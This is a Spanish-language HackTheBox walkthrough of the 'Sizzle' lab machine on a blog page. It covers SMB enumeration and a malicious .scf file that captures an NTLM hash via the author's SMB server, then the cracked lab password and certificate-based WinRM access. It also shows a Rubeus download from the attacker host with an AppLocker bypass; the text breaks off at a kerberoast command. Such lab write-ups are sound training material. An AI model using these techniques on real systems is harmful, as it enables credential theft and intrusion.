<!doctype html>
<html
  lang="en-us" 
  
    data-theme-mode="true"
  
>
  <head>
    <meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/>







  

<title>
  Sizzle | Fouen
</title>
<meta
  name="description"
  content="Web enjoyer"
/>










<script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"x转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"❗Failed❗\",\"success\":\"Success✔️\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"time\":null}}}");
</script>

<script>
  window.siteConfig.swPath = '\/sw.js';
</script>











  
  
  
    
  

  
  
  
    
  

  
    

<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>






  <link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  />



  







  
 <link rel="stylesheet" href="/css/loader.min.2ad0e9bbffb534e893c0ecefc44787a277cf851387e8ad9dccfbc3a5f0886dbe.css" />




  <meta property="og:type" content="website" />
  <meta property="og:title" content="Sizzle | Fouen" />
  <meta
    property="og:description"
    content="Web enjoyer"
  />
  <meta property="og:url" content="https://fouen.github.io/post/hackthebox/sizzle/" />
  <meta
    property="og:site_name"
    content="Fouen"
  />
  <meta
    property="og:image"
    content="/images/sizzle.png"
  />
  <meta property="article:author" content="Fouen" />
  <meta property="article:published_time" content="2024-07-22T00:00:00&#43;00:00" />
  <meta property="article:modified_time" content="2024-07-22T00:00:00&#43;00:00" />
  
    <meta property="article:tag" content="Insane" />
  
  
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/sizzle.png" />
  
  
  
  
  




<link rel="shortcut icon" href="/favicon.ico">








  
 <link rel="stylesheet" href="/css/main.min.cf73cf27e77f9541bc095208d0043dec410884804c1a00da7edb60b4436a1047.css" />





  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />






  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />








  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    
    
    
    
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
  ></script>





  


  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />





    
  </head>
  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <img src="/images/perfilsinfondo.png" alt="loading" />
        
      </div>
      <div class="loading-word">...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>


<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


  <div class="notification-wrapper">
    <h1>New version found</h1>
    <p>The website seems to have new content, do you want to update?</p>
    <div class="notification-btn">
      <button id="notification-update-btn">Update</button>
      <button id="notification-close-btn">Cancel</button>
    </div>
  </div>

    <div id="container">
      <div id="wrap">
        
<div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe632;
          
        </div>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe62f;
          
        </div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
    
  </nav>
</div>
<header id="header">
  
    
    <picture></picture>
      <img fetchpriority="high" src="/images/sizzle.png" alt="Sizzle">
    
  

  <div id="header-outer">
    <div id="header-title">
      
        
        
          
        
  
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">Sizzle</h1>
          </a>
        
      
  
      
        
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>
        <div id="content"
          class="sidebar-left"
            >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    >
      
        <div class="sidebar-toc-sidebar">
          <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconocimiento">Reconocimiento</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#ftp">FTP</a></li>
        <li><a href="#https">HTTPS</a></li>
        <li><a href="#smb">SMB</a></li>
      </ul>
    </li>
    <li><a href="#explotación">Explotación</a>
      <ul>
        <li><a href="#evil-scf">Evil scf</a></li>
        <li><a href="#ad-certificate-services">AD Certificate Services</a></li>
      </ul>
    </li>
    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
      <ul>
        <li><a href="#bloodhound">Bloodhound</a></li>
        <li><a href="#rubeus">Rubeus</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
        </div>
        <div class="sidebar-common-sidebar hidden">
          
<div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="Fouen"
    class="lazyload"
  />
  <div class="sidebar-author-name">Fouen</div>
  <div class="sidebar-description">Web enjoyer</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      3
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">9</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/FOUEN"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
    <div class="icon-linkedin sidebar-social-icon">
      <a
        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
        itemprop="url"
        target="_blank"
        aria-label="linkedin"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe62f;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
</div>

        </div>
      

      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
    
  </div>
</aside>

          <section id="main">
  <article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta">
      <div class="article-date">
  <a
    href="https://fouen.github.io/post/hackthebox/sizzle/"
    class="article-date-link"
    data-aos="zoom-in"
  >
    <time datetime="2024-07-22 00:00:00 &#43;0000 UTC" itemprop="datePublished"
      >2024-07-22</time
    >
    <time style="display: none;" id="post-update-time"
      >2024-07-22</time
    >
  </a>
</div>

      <div class="article-category">
  
    <a
      class="article-category-link"
      href="/categories/hackthebox"
      data-aos="zoom-in"
      >HACKTHEBOX</a
    >
  
</div>

    </div>
    <div class="hr-line"></div>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h2 id="reconocimiento">
<a class="header-anchor" href="#reconocimiento"></a>
Reconocimiento
</h2><h3 id="nmap">
<a class="header-anchor" href="#nmap"></a>
Nmap
</h3><p>Escaneamos la maquina para ver que puertos tiene abiertos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p- --open --min-rate <span style="color:#ae81ff">5000</span> -Pn -n 10.10.11.8
</span></span></code></pre></div><pre tabindex="0"><code>PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49700/tcp open  unknown
49719/tcp open  unknown
49721/tcp open  unknown
</code></pre><h3 id="ftp">
<a class="header-anchor" href="#ftp"></a>
FTP
</h3><p>Probamos a entrar con el usuario anonymous:</p>
<pre tabindex="0"><code>ftp 10.10.10.103
</code></pre><p>Nos deja entrar pero no vemos nada</p>
<h3 id="https">
<a class="header-anchor" href="#https"></a>
HTTPS
</h3><p>En la web vemos un gif:</p>
<p><img src="img/bacon.png" alt=""></p>
<p>Vamos a hacer fuzzing para ver si hay mas direcorios:</p>
<pre tabindex="0"><code>&gt; gobuster dir -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.103
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client/       (Status: 403) [Size: 1233]
/certsrv/mscep_admin  (Status: 401) [Size: 1293]
/certenroll/          (Status: 403) [Size: 1233]
/certsrv/             (Status: 401) [Size: 1293]
/certsrv/mscep/mscep.dll (Status: 401) [Size: 1293]
/images/              (Status: 403) [Size: 1233]
Progress: 211 / 212 (99.53%)
===============================================================
Finished
===============================================================
</code></pre><p>Vemos que hay un directorio <code>certsrv</code> el cual no tenemos permiso pero puede ser interesante si encontramos credenciales</p>
<h3 id="smb">
<a class="header-anchor" href="#smb"></a>
SMB
</h3><p>Vamos a enumerar los recursos comaprtidos con smbmap:</p>
<pre tabindex="0"><code>&gt; smbmap -H 10.10.10.103 -u &#34;null&#34;

[+] Guest session   	IP: 10.10.10.103:445	Name: 10.10.10.103                                      
    Disk                    	Permissions	Comment
	----                    	-----------	-------
	ADMIN$              	NO ACCESS	Remote Admin
	C$                  	NO ACCESS	Default share
	CertEnroll          	NO ACCESS	Active Directory Certificate Services share
	Department Shares   	READ ONLY	
	IPC$                	READ ONLY	Remote IPC
	NETLOGON            	NO ACCESS	Logon server share 
	Operations          	NO ACCESS	
	SYSVOL              	NO ACCESS	Logon server share
</code></pre><p>Tenemos permiso de lectura en el directorio <code>Department Shares</code>, ahí dentro encontraremos otro llamado <code>users</code> donde podemos ver un listado de posibles usuarios:</p>
<pre tabindex="0"><code>&gt; smbmap -H 10.10.10.103 -u &#34;null&#34; -r Department\ Shares/Users

[+] Guest session   	IP: 10.10.10.103:445	Name: 10.10.10.103                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department SharesUsers\*
	dr--r--r--                0 Tue Jul 10 23:39:32 2018	.
	dr--r--r--                0 Tue Jul 10 23:39:32 2018	..
	dr--r--r--                0 Mon Jul  2 21:18:43 2018	amanda
	dr--r--r--                0 Mon Jul  2 21:19:06 2018	amanda_adm
	dr--r--r--                0 Mon Jul  2 21:18:28 2018	bill
	dr--r--r--                0 Mon Jul  2 21:18:31 2018	bob
	dr--r--r--                0 Mon Jul  2 21:19:14 2018	chris
	dr--r--r--                0 Mon Jul  2 21:18:39 2018	henry
	dr--r--r--                0 Mon Jul  2 21:18:34 2018	joe
	dr--r--r--                0 Mon Jul  2 21:18:53 2018	jose
	dr--r--r--                0 Tue Jul 10 23:39:32 2018	lkys37en
	dr--r--r--                0 Mon Jul  2 21:18:48 2018	morgan
	dr--r--r--                0 Mon Jul  2 21:19:20 2018	mrb3n
	dr--r--r--                0 Wed Sep 26 07:45:32 2018	Public
</code></pre><p>Nos guardamos este listado:</p>
<p>Este comando nos servirá para que nos devuelva solo el nombre de los usuarios y así poder enviarlos a un archivo mas cómodamente</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbmap -H 10.10.10.103 -u <span style="color:#e6db74">&#34;null&#34;</span> -r Department<span style="color:#ae81ff">\ </span>Shares/Users | awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span> | tail -n +8
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; smbmap -H 10.10.10.103 -u <span style="color:#e6db74">&#34;null&#34;</span> -r Department<span style="color:#ae81ff">\ </span>Shares/Users | awk 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;{print $NF}&#39;</span> | tail -n +8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>amanda
</span></span><span style="display:flex;"><span>amanda_adm
</span></span><span style="display:flex;"><span>bill
</span></span><span style="display:flex;"><span>bob
</span></span><span style="display:flex;"><span>chris
</span></span><span style="display:flex;"><span>henry
</span></span><span style="display:flex;"><span>joe
</span></span><span style="display:flex;"><span>jose
</span></span><span style="display:flex;"><span>lkys37en
</span></span><span style="display:flex;"><span>morgan
</span></span><span style="display:flex;"><span>mrb3n
</span></span><span style="display:flex;"><span>Public
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>fouen@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ $touch users
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>fouen@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ $smbmap -H 10.10.10.103 -u <span style="color:#e6db74">&#34;null&#34;</span> -r Department<span style="color:#ae81ff">\ </span>Shares/Users | awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span> | tail -n +8 &gt; users
</span></span></code></pre></div><p>Vamos a crearnos una montura en el directorio <code>Department Shares</code> para poder movernos mejor:</p>
<pre tabindex="0"><code>mkdir /mnt/montura
</code></pre><pre tabindex="0"><code>sudo mount -t cifs &#34;//10.10.10.103/Department Shares&#34; /mnt/montura -o username=null,password=
</code></pre><p>Ya con la montura hacemos un <code>tree</code> para ver rápidamente lo que hay:</p>
<pre tabindex="0"><code>&gt; tree
.
├── Accounting
├── Audit
├── Banking
│   └── Offshore
│       ├── Clients
│       ├── Data
│       ├── Dev
│       ├── Plans
│       └── Sites
├── CEO_protected
├── Devops
├── Finance
├── HR
│   ├── Benefits
│   ├── Corporate Events
│   ├── New Hire Documents
│   ├── Payroll
│   └── Policies
├── Infosec
├── Infrastructure
├── IT
├── Legal
├── M&amp;A
├── Marketing
├── R&amp;D
├── Sales
├── Security
├── Tax
│   ├── 2010
│   ├── 2011
│   ├── 2012
│   ├── 2013
│   ├── 2014
│   ├── 2015
│   ├── 2016
│   ├── 2017
│   └── 2018
├── Users
│   ├── amanda
│   ├── amanda_adm
│   ├── bill
│   ├── bob
│   ├── chris
│   ├── henry
│   ├── joe
│   ├── jose
│   ├── lkys37en
│   ├── morgan
│   ├── mrb3n
│   └── Public
└── ZZ_ARCHIVE
    ├── AddComplete.pptx
    ├── AddMerge.ram
    ├── ConfirmUnprotect.doc
    ├── ConvertFromInvoke.mov
    ├── ConvertJoin.docx
    ├── CopyPublish.ogg
    ├── DebugMove.mpg
    ├── DebugSelect.mpg
    ├── DebugUse.pptx
    ├── DisconnectApprove.ogg
    ├── DisconnectDebug.mpeg2
    ├── EditCompress.xls
    ├── EditMount.doc
    ├── EditSuspend.mp3
    ├── EnableAdd.pptx
    ├── EnablePing.mov
    ├── EnableSend.ppt
    ├── EnterMerge.mpeg
    ├── ExitEnter.mpg
    ├── ExportEdit.ogg
    ├── GetOptimize.pdf
    ├── GroupSend.rm
    ├── HideExpand.rm
    ├── InstallWait.pptx
    ├── JoinEnable.ram
    ├── LimitInstall.doc
    ├── LimitStep.ppt
    ├── MergeBlock.mp3
    ├── MountClear.mpeg2
    ├── MoveUninstall.docx
    ├── NewInitialize.doc
    ├── OutConnect.mpeg2
    ├── PingGet.dot
    ├── ReceiveInvoke.mpeg2
    ├── RemoveEnter.mpeg3
    ├── RemoveRestart.mpeg
    ├── RequestJoin.mpeg2
    ├── RequestOpen.ogg
    ├── ResetCompare.avi
    ├── ResetUninstall.mpeg
    ├── ResumeCompare.doc
    ├── SelectPop.ogg
    ├── SuspendWatch.mp4
    ├── SwitchConvertFrom.mpg
    ├── UndoPing.rm
    ├── UninstallExpand.mp3
    ├── UnpublishSplit.ppt
    ├── UnregisterPing.pptx
    ├── UpdateRead.mpeg
    ├── WaitRevoke.pptx
    └── WriteUninstall.mp3
</code></pre><h2 id="explotación">
<a class="header-anchor" href="#explotaci%c3%b3n"></a>
Explotación
</h2><p>Al ser una montura de un smb tiene unas acl especificas que aunque seamos root tenemos los permisos que nos asignan, estos podemos verlos usando <code>smbcacls</code> :</p>
<pre tabindex="0"><code>&gt; smbcacls &#34;//10.10.10.103/Department Shares&#34; Users/amanda -N

REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
</code></pre><p>Podemos ver que en Everyone (nosotros) tenemos permiso <code>READ</code>, vamos a buscar uno que nos de permisos para poder escribir:</p>
<pre tabindex="0"><code>&gt; for directory in $(ls); do echo -e &#34;\n$directory&#34;; echo &#34;$(smbcacls &#34;//10.10.10.103/Department Shares&#34; Users/$directory -N | grep Everyone)&#34;; done

amanda
ACL:Everyone:ALLOWED/OI|CI|I/READ

amanda_adm
ACL:Everyone:ALLOWED/OI|CI|I/READ

bill
ACL:Everyone:ALLOWED/OI|CI|I/READ

bob
ACL:Everyone:ALLOWED/OI|CI|I/READ

chris
ACL:Everyone:ALLOWED/OI|CI|I/READ

henry
ACL:Everyone:ALLOWED/OI|CI|I/READ

joe
ACL:Everyone:ALLOWED/OI|CI|I/READ

jose
ACL:Everyone:ALLOWED/OI|CI|I/READ

lkys37en
ACL:Everyone:ALLOWED/OI|CI|I/READ

morgan
ACL:Everyone:ALLOWED/OI|CI|I/READ

mrb3n
ACL:Everyone:ALLOWED/OI|CI|I/READ

Public
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
</code></pre><h3 id="evil-scf">
<a class="header-anchor" href="#evil-scf"></a>
Evil scf
</h3><p>Vemos que <code>Public</code> tiene permisos de escritura</p>
<p>Vamos a probar a cargar un archivo <code>.scf</code> malicioso:</p>
<p>Primero nos creamos un recurso compartido:</p>
<pre tabindex="0"><code>imapcket-smbserver smbFolder $(pwd) -smb2support
</code></pre><p>Ahora en la montura en el directorio <code>/mnt/montura/Users/Public</code> creamos un archivo <code>evil.scf</code> con este contenido:</p>
<pre tabindex="0"><code>[Shell]
Command=2
IconFile=\\10.10.14.15\smbFolder\icon.ico
[Taskbar]
Command=ToggleDesktop
</code></pre><blockquote>
<p><strong>Explicación:</strong>
Al crear un archivo <code>.scf</code> que carga un icono desde un servidor SMB controlado por el atacante, cualquier usuario que visualice ese archivo enviará automáticamente una petición al servidor SMB, permitiendo al atacante capturar el hash NTLM del usuario</p>
</blockquote>
<pre tabindex="0"><code>&gt; sudo !!

sudo impacket-smbserver smbFolder $(pwd) -smb2support
[sudo] contraseña para fouen: 
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,63200)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:0d98dea6f3b011fbe93d619d8178d50f:01010000000000000061099728dbda01afc624fcf945efd400000000010010005300620079004600640057006a005900030010005300620079004600640057006a005900020010004f007500550068006400520047007900040010004f007500550068006400520047007900070008000061099728dbda010600040002000000080030003000000000000000010000000020000037cb1a51a52c616db4fba8e2e23cb35a88cedc334240d42681703dc2f6b112280a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000
</code></pre><p>Desencriptamos el hash:</p>
<pre tabindex="0"><code>&gt; john -w:/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 3 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)     
1g 0:00:00:05 DONE (2024-07-21 06:56) 0.1821g/s 2079Kp/s 2079Kc/s 2079KC/s Ashiah08..Armani3
Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably
Session completed.
</code></pre><p>Ya tenemos unas credenciales, vamos a verificar estas credenciales y ver si podemos ganar acceso a la máquina</p>
<pre tabindex="0"><code>&gt; crackmapexec smb 10.10.10.103 -u &#34;Amanda&#34; -p &#34;Ashare1972&#34;

SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\Amanda:Ashare1972
</code></pre><p>La contraseña es válida, vamos a probar en <code>winrm</code> para ver si directamente podemos ganar acceso al sistema con <code>evil-winrm</code>:</p>
<pre tabindex="0"><code>&gt; crackmapexec winrm 10.10.10.103 -u &#34;Amanda&#34; -p &#34;Ashare1972&#34;

SMB         10.10.10.103    5986   SIZZLE           [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
HTTP        10.10.10.103    5986   SIZZLE           [*] https://10.10.10.103:5986/wsman
HTTP        10.10.10.103    5986   SIZZLE           [-] HTB.LOCAL\Amanda:Ashare1972  &#39;The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: &#39;&#39;&#39;
</code></pre><p>De momento no podemos entrar</p>
<h3 id="ad-certificate-services">
<a class="header-anchor" href="#ad-certificate-services"></a>
AD Certificate Services
</h3><p>Como habíamos visto antes había una página que no teníamos permiso, vamos a probar estas credenciales ahí a ver si ya nos deja:</p>
<p><img src="img/certsrv.png" alt=""></p>
<p>Ya nos deja entrar, aquí podemos crear un certificado privado si le proporcionamos nuestro <code>csr</code>:</p>
<p><img src="img/cert.png" alt=""></p>
<p>Creamos nuestras claves:</p>
<pre tabindex="0"><code>openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
</code></pre><p>Ponemos el <code>.csr</code> e la web y nos devuelve el certificado que podremos usar para entrar al usuario mediante <code>evil-winrm</code> ya que la conexión es a través de SSL:</p>
<pre tabindex="0"><code>evil-winrm -S -c ../certnew.cer -k amanda.key -i 10.10.10.103 -u &#34;Amanda&#34; -p &#34;Ashare1972&#34;
</code></pre><h2 id="escalada-de-privilegios">
<a class="header-anchor" href="#escalada-de-privilegios"></a>
Escalada de privilegios
</h2><h3 id="bloodhound">
<a class="header-anchor" href="#bloodhound"></a>
Bloodhound
</h3><p>Ya tenemos acceso, ahora vamos a ejecutar <code>bloodhound</code> para enumerar mejor el sistema:</p>
<p>Esto nos creara unos archivos <code>.json</code></p>
<pre tabindex="0"><code>bloodhound-python -c all -u &#34;Amanda&#34; -p &#34;Ashare1972&#34; -ns 10.10.10.103 -d HTB.LOCAL
</code></pre><p>Necesitamos tener <code>neo4j</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>neo4j console
</span></span></code></pre></div><p>Ahora ya ejecutamos <code>bloodhound</code> y cargamos los <code>.json</code></p>
<p>Mirando el <code>bloodhound</code> vemos varias cosas:</p>
<ol>
<li>La cuenta <code>MRLKY</code> es kerberoasteable</li>
</ol>
<p><img src="img/kerb.png" alt=""></p>
<ol start="2">
<li>Esa misma cuenta puede efectuar ataques <code>DCSync</code>:</li>
</ol>
<p><img src="img/dcsync.png" alt=""></p>
<h3 id="rubeus">
<a class="header-anchor" href="#rubeus"></a>
Rubeus
</h3><p>Vamos a usar <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe">rubeus</a></p>
<p>Nos lo pasamos a la máquina:</p>
<ol>
<li>Creamos un servidor en python donde tengamos alojado el <code>.exe</code></li>
</ol>
<pre tabindex="0"><code>python3 -m http.server 80
</code></pre><ol start="2">
<li>Lo descargamos en la máquina víctima</li>
</ol>
<pre tabindex="0"><code>iwr -uri http://10.10.14.15/Rubeus.exe -Outfile Rubeus.exe
</code></pre><p>No nos deja ejecutar <code>rubeus</code> debe haber algún <code>AppLocker</code> por detrás, voy a probar ejecutarlo desde la ruta <code>C:\Windows\system32\spool\drivers\color</code> que suele estar excluida de las políticas de los <code>AppLocker</code>:</p>
<pre tabindex="0"><code>*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color&gt; .\Rubeus.exe 

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0
</code></pre><p>Ya nos va</p>
<p>Vamos a hacer el ataque:</p>
<pre tabindex="0"><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
